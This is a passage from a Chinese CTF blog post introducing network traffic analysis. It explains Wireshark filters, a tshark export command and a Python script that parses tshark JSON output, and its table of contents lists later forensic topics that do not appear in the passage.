<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>Misc-流量分析 - ⚡Lunatic BLOG⚡</title><meta name=author content="Lunatic"><meta name=description content="This is a Simple Guide for Network Traffic Analysis.
"><meta name=keywords content='CTF,Misc'><meta itemprop=name content="Misc-流量分析"><meta itemprop=description content="This is a Simple Guide for Network Traffic Analysis."><meta itemprop=datePublished content="2025-05-15T10:15:27+08:00"><meta itemprop=dateModified content="2025-05-15T10:15:27+08:00"><meta itemprop=wordCount content="4582"><meta itemprop=keywords content="CTF,Misc"><meta property="og:url" content="https://goodlunatic.github.io/posts/5422d65/"><meta property="og:site_name" content="⚡Lunatic BLOG⚡"><meta property="og:title" content="Misc-流量分析"><meta property="og:description" content="This is a Simple Guide for Network Traffic Analysis."><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-05-15T10:15:27+08:00"><meta property="article:modified_time" content="2025-05-15T10:15:27+08:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Misc"><meta name=twitter:card content="summary"><meta name=twitter:title content="Misc-流量分析"><meta name=twitter:description content="This is a Simple Guide for Network Traffic Analysis."><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical type=text/html href=https://goodlunatic.github.io/posts/5422d65/ title="Misc-流量分析 - ⚡Lunatic BLOG⚡"><link rel=prev type=text/html href=https://goodlunatic.github.io/posts/32c3b27/ title="DASCTF 2024最后一战 Misc Writeup"><link rel=next type=text/html href=https://goodlunatic.github.io/posts/ca974cb/ title="Frida Learning Record"><link rel=alternate type=text/markdown href=https://goodlunatic.github.io/posts/5422d65/index.md title="Misc-流量分析 - ⚡Lunatic BLOG⚡"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Misc-流量分析","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/goodlunatic.github.io\/posts\/5422d65\/"},"genre":"posts","keywords":"CTF, Misc","wordcount":4582,"url":"https:\/\/goodlunatic.github.io\/posts\/5422d65\/","datePublished":"2025-05-15T10:15:27+08:00","dateModified":"2025-05-15T10:15:27+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Lunatic"},"description":""}</script><script src=/js/head/color-scheme.min.js></script></head><body data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=left><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容…… id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容…… id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集><div class="details collection-details open"><div class="details-summary collection-summary"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i>
<span class=collection-name title=合集>CTF-Misc入门指南</span>
<span class=collection-count>6</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content collection-content"><nav><ul class=collection-list><li class=collection-item><a href=/posts/1ad9200/ title="[置顶] CTF-Misc Guide">[置顶] CTF-Misc Guide</a></li><li class=collection-item><a href=/posts/c5bc8a2/ title=Misc-AI安全>Misc-AI安全</a></li><li class=collection-item><a href=/posts/761da51/ title=Misc-数字取证>Misc-数字取证</a></li><li class=collection-item><span class=active title=Misc-流量分析>Misc-流量分析</span></li><li class=collection-item><a href=/posts/c49ae8a/ title=Misc-数据安全>Misc-数据安全</a></li><li class=collection-item><a href=/posts/01ebd40/ title=Misc-工控安全>Misc-工控安全</a></li></ul><div class=collection-nav-simple><a href=/posts/761da51/ class=collection-nav-item rel=prev title=Misc-数字取证><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i></a><span class=text-secondary>4/6</span><a href=/posts/c49ae8a/ class=collection-nav-item rel=next title=Misc-数据安全><i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></nav></div></div><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
<span class=related-title>相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/posts/01ebd40/ title=Misc-工控安全>Misc-工控安全</a></li><li class=related-item><a href=/posts/32c3b27/ title="DASCTF 2024最后一战 Misc Writeup">DASCTF 2024最后一战 Misc Writeup</a></li><li class=related-item><a href=/posts/87bd986/ title="2025 能源网络安全大赛 Misc Writeup">2025 能源网络安全大赛 Misc Writeup</a></li><li class=related-item><a href=/posts/e9c4fc7/ title="2025 UCSCCTF Misc Writeup">2025 UCSCCTF Misc Writeup</a></li><li class=related-item><a href=/posts/c49ae8a/ title=Misc-数据安全>Misc-数据安全</a></li></ul></div></div><div class=aside-custom><a href target=_blank rel=external><img src=/images/zsxq.webp alt="Lunatic Planet QR code" width=100%></a></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>Misc-流量分析</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://goodlunatic.github.io title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><img class=avatar src=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png alt=Lunatic height=16 width=16>&nbsp;Lunatic</a></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/ctf/ class=post-category title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> CTF</a> 和 <a href=/collections/ctf-misc%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/ class=post-collection title="合集 - CTF-Misc入门指南"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i> CTF-Misc入门指南</a></span></div><div class=post-meta-line><span title="发布于 2025-05-15 10:15:27"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2025-05-15>2025-05-15</time></span>&nbsp;<span title="4582 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 4600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 22 分钟</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title=Misc-流量分析><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_page_pv>-</span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#wireshark基础>WireShark基础</a></li><li><a href=#tshark使用教程>tshark使用教程</a></li><li><a href=#流量分析基础考点>流量分析基础考点</a><ul><li><a href=#1直接搜索flag明文或者编码过的flag>1、直接搜索flag明文或者编码过的flag:</a></li><li><a href=#2流量包端口隐写可能会有01互换>2、流量包端口隐写（可能会有01互换）</a></li><li><a href=#3tcpftp协议传输文件binwalk和foremost都没用>3、TCP/FTP协议传输文件(binwalk和foremost都没用)：</a></li><li><a href=#4有时候可能需要根据ip或者版本分类导出>4、有时候可能需要根据IP或者版本分类导出</a></li></ul></li><li><a href=#usb流量分析>USB流量分析</a><ul><li><a href=#键盘流量分析>键盘流量分析</a></li><li><a href=#鼠标流量>鼠标流量</a></li><li><a href=#数位板流量分析>数位板流量分析：</a></li></ul></li><li><a href=#sql注入流量分析>SQL注入流量分析</a></li><li><a href=#webshell流量分析>Webshell流量分析</a><ul><li><a href=#菜刀流量分析>菜刀流量分析</a></li><li><a href=#哥斯拉流量分析>哥斯拉流量分析</a><ul><li><a href=#php_xor_raw>php_xor_raw</a></li><li><a href=#php_xor_base64>php_xor_base64</a></li><li><a href=#php_eval_xor_base64>php_eval_xor_base64</a></li></ul></li><li><a href=#冰蝎流量分析>冰蝎流量分析</a><ul><li><a href=#xor_base64>XOR_base64</a></li><li><a href=#aes_base64>AES_base64</a></li></ul></li><li><a href=#蚁剑流量分析>蚁剑流量分析</a><ul><li><a href=#reverse>Reverse</a></li><li><a href=#rot13>ROT13</a></li><li><a href=#rsa>RSA</a></li></ul></li><li><a href=#cobalstrike流量分析>CobalStrike流量分析</a><ul><li><a href=#密钥对文件的情况>密钥对文件的情况</a></li><li><a href=#给beacon的情况>给Beacon的情况</a></li></ul></li></ul></li><li><a href=#ntlmv2流量分析>NTLMv2流量分析</a><ul><li><a href=#提取-ntlmv2-哈希值并破解smb协议>提取 NTLMv2 哈希值并破解（SMB协议）</a></li><li><a href=#提取-ntlmv2-哈希值并破解http协议>提取 NTLMv2 哈希值并破解（HTTP协议）</a></li><li><a href=#提取-ntlmv2-哈希值并破解smtp协议>提取 NTLMv2 哈希值并破解（SMTP协议）</a></li></ul></li><li><a href=#工控流量分析>工控流量分析</a><ul><li><a href=#modbus-协议分析>Modbus 协议分析</a><ul><li><a href=#例题1-hngk-modbus流量分析>例题1 HNGK-Modbus流量分析</a></li></ul></li><li><a href=#s7comm-协议分析>S7comm 协议分析</a><ul><li><a href=#例题1-2020icsc湖州站工控协议数据分析>例题1 2020ICSC湖州站—工控协议数据分析</a></li><li><a href=#例题2-2020icsc济南站被篡改的数据>例题2 2020ICSC济南站—被篡改的数据</a></li><li><a href=#例题3-枢网智盾2021异常流分析>例题3 枢网智盾2021—异常流分析</a></li><li><a href=#例题4-枢网智盾2021工控协议分析>例题4 枢网智盾2021—工控协议分析</a></li></ul></li></ul></li><li><a href=#蓝牙流量分析>蓝牙流量分析</a><ul><li><a href=#obex协议>OBEX协议</a></li><li><a href=#att协议>ATT协议</a></li><li><a href=#smp协议>SMP协议</a></li></ul></li><li><a href=#邮件stmp流量分析>邮件(STMP)流量分析</a></li><li><a href=#无线流量分析>无线流量分析</a></li><li><a href=#dns流量分析>DNS流量分析</a><ul><li><a href=#dnslog外带的流量>DNSlog外带的流量</a></li><li><a href=#数据以二进制藏在dns各种解析记录中>数据以二进制藏在DNS各种解析记录中</a></li><li><a href=#信息以二进制藏在端口号末尾中>信息以二进制藏在端口号末尾中</a></li></ul></li><li><a href=#slltls加密流量分析>SLL、TLS加密流量分析</a></li><li><a href=#icmp流量分析>ICMP流量分析</a></li><li><a href=#vpn流量分析>VPN流量分析</a><ul><li><a href=#shadowsocks流量分析>Shadowsocks流量分析</a></li><li><a href=#vmessv2ray流量分析>VMess(V2ray)流量分析</a><ul><li><a href=#vmessmd5>VMessMD5</a></li><li><a href=#vmessaead>VMessAEAD</a></li></ul></li></ul></li><li><a href=#ads-b流量分析>ADS-B流量分析</a></li><li><a href=#oicq协议qq协议>OICQ协议(QQ协议)</a></li><li><a href=#损坏的流量包分析>损坏的流量包分析</a></li><li><a href=#从流量包中找异常流量>从流量包中找异常流量</a></li></ul></nav></div></div><div class=content id=content><p><strong>This is a Simple Guide for Network Traffic Analysis.</strong></p><p>拿到流量包后，第一件事就是可以先 <code>strings | grep flag{</code> 一下，说不定 flag 就直接出了</p><p>当然也可以使用<code>@凤二西</code>师傅的 <code>破空_flag查找工具3.5.exe</code> 来搜索 flag</p><h2 class=heading-element id=wireshark基础><span>WireShark基础</span>
<a href=#wireshark%e5%9f%ba%e7%a1%80 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>刚刚接触流量分析的同学，看到<code>Wireshark</code>中密密麻麻的流量包和字段可能会感觉无从下手</p><p>但是其实我们要明白一点就是，流量分析的第一步就是过滤，把流量包过滤到我们能掌控的范围内，然后再逐个分析</p><p><code>wireshark</code>的过滤器其实上手很简单，用熟悉了以后会给人一种非常顺手的感觉</p><p>常见的协议比如<code>http</code>，常用的有下面这些参数，其实只要在过滤器中输入<code>htt</code>. 它就会自动提示你后面的字段了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http.request.method == &#34;POST&#34;
</span></span><span class=line><span class=cl>http.request.full_uri == “XXX”
</span></span><span class=line><span class=cl>......</span></span></code></pre></td></tr></table></div></div><p>除了协议以外，还有一些比较常用的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 包含什么内容的帧</span>
</span></span><span class=line><span class=cl>frame contains <span class=s2>&#34;XXX&#34;</span></span></span></code></pre></td></tr></table></div></div><p>其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）</p><p>有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了</p><p><img loading=lazy src=/posts/5422d65/imgs/N1.png alt=/posts/5422d65/imgs/N1.png height=1597 width=2557></p><h2 class=heading-element id=tshark使用教程><span>tshark使用教程</span>
<a href=#tshark%e4%bd%bf%e7%94%a8%e6%95%99%e7%a8%8b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>导出流量包中所有POST数据包的data数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 1.pcapng -Y <span class=s2>&#34;http.request.method == POST&#34;</span> -T fields -e data.data &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># -r：指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -Y：使用过滤器</span>
</span></span><span class=line><span class=cl><span class=c1># -T：表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e：指定提取的字段</span></span></span></code></pre></td></tr></table></div></div><p>以下两个命令是Linux中的命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># uinq：去除重复行</span>
</span></span><span class=line><span class=cl><span class=c1># sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>在我们清楚了tshark的相关命令后，我们就可以尝试编写Python脚本来调用tshark进行流量包的处理了</p><p>这种用法通常在我们分析较大流量包并且需要频繁复制里面的数据的时候比较实用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>file_path</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span> <span class=c1># 流量包的路径</span>
</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;tshark&#34;</span><span class=p>,</span>  <span class=c1># tshark的路径，如果在环境变量里这里就不用改</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-r&#39;</span><span class=p>,</span> <span class=n>file_path</span><span class=p>,</span>  <span class=c1># 读取指定的 pcapng 文件</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-Y&#39;</span><span class=p>,</span> <span class=s1>&#39;http&#39;</span><span class=p>,</span>  <span class=c1># 过滤出 HTTP 数据包</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-T&#39;</span><span class=p>,</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span>  <span class=c1># 输出为 JSON 格式</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.request.method&#39;</span><span class=p>,</span>  <span class=c1># 请求方法</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.host&#39;</span><span class=p>,</span>  <span class=c1># 请求主机</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.request.uri&#39;</span><span class=p>,</span>  <span class=c1># 请求 URI</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.user_agent&#39;</span><span class=p>,</span>  <span class=c1># 用户代理</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span>  <span class=c1># 请求中的文件数据（POST 请求的内容）</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.response.code&#39;</span><span class=p>,</span>  <span class=c1># 响应代码</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.response.phrase&#39;</span><span class=p>,</span>  <span class=c1># 响应短语</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.content_type&#39;</span>  <span class=c1># 响应内容类型</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>command</span><span class=p>,</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>json_output</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 遍历 JSON 数据并提取字段</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>packet</span> <span class=ow>in</span> <span class=n>json_output</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>layers</span> <span class=o>=</span> <span class=n>packet</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;_source&#39;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;layers&#39;</span><span class=p>,</span> <span class=p>{})</span>
</span></span><span class=line><span class=cl>    <span class=n>request_method</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.request.method&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>request_host</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.host&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>request_uri</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.request.uri&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>user_agent</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.user_agent&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>file_data</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>response_code</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.response.code&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>response_phrase</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.response.phrase&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>content_type</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.content_type&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=流量分析基础考点><span>流量分析基础考点</span>
